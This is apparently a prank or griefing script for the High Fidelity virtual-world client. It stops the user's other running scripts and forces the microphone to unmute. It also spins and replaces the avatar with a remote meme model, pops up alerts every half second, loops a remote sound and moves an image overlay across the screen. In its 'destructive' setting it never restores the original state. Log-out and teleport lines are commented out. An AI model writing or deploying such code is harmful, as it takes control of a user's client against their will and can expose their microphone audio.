(function() {
	var destructive = true;

	var previousAvatar;
	var previousWorldCollisions = true;

	var interval;

	var soundPlaying = false;
	var soundObject = SoundCache.getSound("https://cutelab.space/u/HPE8HE.mp3");
	var soundInjectors = [];

	var imageOverlay;
	var imageSize = {
		w: Window.innerWidth/3,
		h: Window.innerHeight/3,
	}

	var t = 0;
	function update(dt) {
		t++;

		MyAvatar.orientation = Quat.fromPitchYawRollDegrees(
			Math.random()*360,
			Math.random()*360,
			Math.random()*360
		);
		Audio.muted = false;
		MyAvatar.scale = 0.3;
		MyAvatar.skeletonModelURL = "https://hotmilk.space/memes/chungus.fst";

		var halfSize = {
			w: Window.innerWidth/2,
			h: Window.innerHeight/2,
		};
		Overlays.editOverlay(imageOverlay, {
			x:  halfSize.w + Math.sin(t*0.1)*halfSize.w/1.5 - imageSize.w/2,
			y:  halfSize.h + Math.cos(t*0.4)*halfSize.h/2.0 - imageSize.h/2
		})
	}

	function enable() {
		if (destructive) {
			//ScriptDiscoveryService.stopAllScripts();
			//AccountServices.logOut()
			var running = ScriptDiscoveryService.getRunning();
			for (var i=0; i<running.length; i++) {
				var script = running[i];
				if (script.url.indexOf("leaveMeAlone.js")>-1) continue;
				ScriptDiscoveryService.stopScript(script.url)
			}
			// Script.setTimeout(function() {
			// 	Window.location = "hifi://thespot";
			// }, 1000)
		}

		previousAvatar = MyAvatar.skeletonModelURL;
		previousWorldCollisions = MyAvatar.getCollisionsEnabled();

		interval = Script.setInterval(function() {
			Window.alert("please leave me alone");
			MyAvatar.overrideAnimation("qrc:///avatar/animations/jump_standing_launch.fbx", 120, true, 2, 16);

			if (soundObject.downloaded && soundPlaying == false) {
				soundPlaying = true;
				for (var i=0; i<1; i++) {
					Script.setTimeout(function() {
						soundInjectors.push(Audio.playSound(soundObject, {
							volume: 1,
							loop: true,
						}));
					}, i*500);
				}
			} 
		}, 500);
	
		imageOverlay = Overlays.addOverlay("image", {
			x: 0,
			y: 0, 
			width: imageSize.w,
			height: imageSize.h,
			alpha: 1,
			imageURL: "https://cutelab.space/u/Pjqxc2.png"
		});

		Script.update.connect(update);
	}

	function disable() {
		Script.update.disconnect(update);
		Script.clearInterval(interval);

		Script.setTimeout(function() {
			Overlays.deleteOverlay(imageOverlay);

			MyAvatar.orientation = Quat.cancelOutRollAndPitch(MyAvatar.orientation);
			MyAvatar.skeletonModelURL = previousAvatar;
			MyAvatar.scale = 1;
			MyAvatar.restoreAnimation();

			soundInjectors.forEach(function(injector) {
				if (injector.playing) injector.stop();
			});

			Script.setTimeout(function() {
				MyAvatar.setCollisionsEnabled(previousWorldCollisions);
			}, 1000);
		}, 1000);
	}

	enable();
	if (destructive) return;
	Script.setTimeout(disable, 1000*10);
})();